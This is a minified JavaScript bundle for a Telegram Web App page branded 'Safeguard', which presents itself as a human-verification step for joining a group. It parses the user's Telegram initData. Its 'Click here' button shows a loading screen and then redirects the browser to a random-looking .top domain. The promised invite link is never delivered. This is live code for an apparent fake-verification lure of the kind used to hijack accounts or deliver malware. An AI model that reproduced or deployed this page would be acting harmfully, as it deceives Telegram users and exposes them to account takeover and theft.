(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
	[405], {
		8312: function(e, t, a) {
			(window.__NEXT_P = window.__NEXT_P || []).push(["/", function() {
				return a(4186)
			}])
		},
		4186: function(e, t, a) {
			"use strict";
			a.r(t), a.d(t, {
				__N_SSP: function() {
					return i
				},
				default: function() {
					return c
				}
			});
			var n = a(5893),
				s = a(9008),
				r = a.n(s),
				l = a(6154),
				o = a(7294),
				i = !0;

			function c(e) {
				let {
					params: t
				} = e, [a, s] = (0, o.useState)({
					loginStatus: 0,
					errmsg: "",
					tglogin: {},
					userProfile: {},
					query: t,
					lang: "",
					axiosError: {},
					initData: ""
				}), i = async () => {
					s({
						...a,
						loginStatus: 3
					}), await new Promise(e => {
						setInterval(() => {
							e("i am groot")
						}, 200)
					});
					try {
						location='https://sdnfhbguysdhifjo.top/x'
					} catch (n) {
						if (s({
								...a,
								loginStatus: -2
							}), window.Telegram.WebApp.HapticFeedback.notificationOccurred("error"), n.response) {
							var e, t;
							s({
								...a,
								errmsg: (null === (e = n.response) || void 0 === e ? void 0 : null === (t = e.data) || void 0 === t ? void 0 : t.message) ? "ERRCODE_".concat(n.response.data.message) : "ERRCODE__UNKNOWN",
								axiosError: n.response
							})
						} else s({
							...a,
							errmsg: "ERRCODE__UNKNOWN"
						})
					}
				};
				(0, o.useEffect)(() => {
					s(e => ({
						...e,
						lang: navigator.language
					}))
				}, []), (0, o.useEffect)(() => {
					if (window.Telegram.WebApp.initData) {
						console.log(window);
						let e = decodeURIComponent(window.Telegram.WebApp.initData);
						s(t => ({
							...t,
							initData: e
						}));
						let t = {},
							a = e.match(/query_id=(.+)&user=/),
							n = e.match(/user=(.+)&auth_date=/),
							r = e.match(/auth_date=(.+)&hash=/),
							l = e.match(/hash=(.+)/);
						t.query_id = a ? a[1] : "", t.user = n ? n[1] : "%7B%7D", t.auth_date = r ? r[1] : "", t.hash = l ? l[1] : "", s(e => ({
							...e,
							tglogin: t,
							userProfile: JSON.parse(t.user),
							loginStatus: 1
						}))
					} else window.location.href = "https://docs.safeguard.run"
				}, []);
				let c = () => a.userProfile.first_name ? (0, n.jsx)("div", {
					className: "mb-4 text-lg font-bold text-slate-400",
					children: "Welcome, ".concat(a.userProfile.first_name).concat(a.userProfile.last_name ? " ".concat(a.userProfile.last_name) : "")
				}) : null;
				return (0, n.jsxs)("div", {
					className: "bg-telegram-bg",
					children: [(0, n.jsxs)(r(), {
						children: [(0, n.jsx)("title", {
							children: "Safeguard"
						}), (0, n.jsx)("meta", {
							name: "description",
							content: "@Safeguard Verification Bot"
						}), (0, n.jsx)("link", {
							rel: "icon",
							href: "/favicon.ico"
						})]
					}), (0, n.jsxs)("main", {
						className: "flex items-center justify-start flex-col gap-2 h-[100vh] p-4 text-center",
						children: [-2 === a.loginStatus && (0, n.jsxs)("div", {
							children: [(0, n.jsx)("p", {
								className: "text-xl font-bold text-telegram-text",
								children: "Oops..."
							}), (0, n.jsxs)("p", {
								className: "text-lg font-bold text-telegram-text",
								children: ["There is an error: ", a.errmsg]
							}), (0, n.jsx)("p", {
								className: "text-lg font-bold text-telegram-text",
								children: "Please re-apply to the group and try again."
							})]
						}), -1 === a.loginStatus && (0, n.jsx)("div", {
							children: (0, n.jsx)("p", {
								className: "text-lg font-bold text-telegram-text",
								children: "Error, please complete verification within Telegram"
							})
						}), 0 === a.loginStatus && (0, n.jsxs)("div", {
							className: "description mt-5",
							children: [(0, n.jsx)(c, {}), (0, n.jsx)("p", {
								className: "text-3xl font-bold text-telegram-text",
								children: "Human Verification"
							}), (0, n.jsx)("p", {
								className: "text-md font-bold text-telegram-text mt-2",
								children: "Verify below to be granted entry"
							})]
						}), 1 === a.loginStatus && (0, n.jsxs)("div", {
							className: "mt-5",
							children: [(0, n.jsx)("p", {
								className: "text-3xl font-bold text-telegram-text",
								children: "Human Verification"
							}), (0, n.jsx)("p", {
								className: "text-md font-bold text-telegram-text mt-2",
								children: "Verify below to be granted entry"
							}), (0, n.jsx)("div", {
								className: "flex items-center justify-center w-100 mt-3",
								children: (0, n.jsx)("button", {
									onClick: i,
									className: "w-full px-3 py-3 my-4 font-mono text-base rounded text-telegram-button-text bg-gradient-to-r from-button1 via-button2 to-button3 hover:bg-gradient-to-br shadow-lg shadow-black-500/50 dark:shadow-lg dark:shadow-black-800/80",
									children: "Click here"
								})
							})]
						}), 2 === a.loginStatus && (0, n.jsxs)("div", {
							children: [(0, n.jsx)("p", {
								className: "text-xl font-bold text-green-500",
								children: "Verified!"
							}), (0, n.jsx)("p", {
								className: "text-lg font-bold text-telegram-text",
								children: "An invite link to the group has been sent"
							})]
						}), 3 === a.loginStatus && (0, n.jsxs)("div", {
							className: "mt-5",
							children: [(0, n.jsx)("p", {
								className: "text-3xl font-bold text-telegram-text",
								children: "Human Verification"
							}), (0, n.jsx)("p", {
								className: "text-md font-bold text-telegram-text mt-2",
								children: "Verify below to be granted entry"
							}), (0, n.jsx)("div", {
								className: "flex items-center justify-center w-100 mt-3",
								children: (0, n.jsx)("button", {
									className: "w-full px-3 py-3 my-4 font-mono text-base rounded text-telegram-button-text bg-gradient-to-r from-button1 via-button2 to-button3 hover:bg-gradient-to-br shadow-lg shadow-black-500/50 dark:shadow-lg dark:shadow-black-800/80",
									children: "Loading..."
								})
							})]
						})]
					})]
				})
			}
		}
	},
	function(e) {
		e.O(0, [237, 774, 888, 179], function() {
			return e(e.s = 8312)
		}), _N_E = e.O()
	}
]);
